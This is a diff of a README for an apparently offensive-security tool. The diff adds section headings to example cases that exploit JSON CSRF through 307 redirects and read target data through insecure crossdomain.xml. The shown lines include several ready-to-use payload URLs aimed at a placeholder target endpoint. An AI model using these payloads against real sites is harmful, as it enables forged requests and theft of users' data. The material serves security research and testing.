@@ -31,7 +31,7 @@ This is useful for Chrome >=62, where you can't access SWF directly, or if you w
 
 If you have the questions regarding this repository - ping me in the Twitter: [@h1_sp1d3r](https://twitter.com/h1_sp1d3r)
 
-## Example cases
+## Example cases (CSRF)
 1) Exploit JSON CSRF, POST-based, 307 redirect:
 ```
 https://example.com/test.swf?jsonData={"test":1}&php_url=https://example.com/test.php&endpoint=https://sometargethost.com/endpoint
@@ -44,6 +44,7 @@ https://example.com/read.html?jsonData={"test":1}&php_url=https://example.com/te
 ```
 https://example.com/test.swf?jsonData=[xmldada]&php_url=https://example.com/test.php&endpoint=https://sometargethost.com/endpoint&ct=application/xml
 ```
+## Example cases (read responses using insecure crossdomain.xml)
 3) Exploit insecure crossdomain.xml (read data from target), GET-based, no 307 redirect:
 ```
 https://example.com/read.html?jsonData=&endpoint=https://sometargethost.com/endpoint&reqmethod=GET
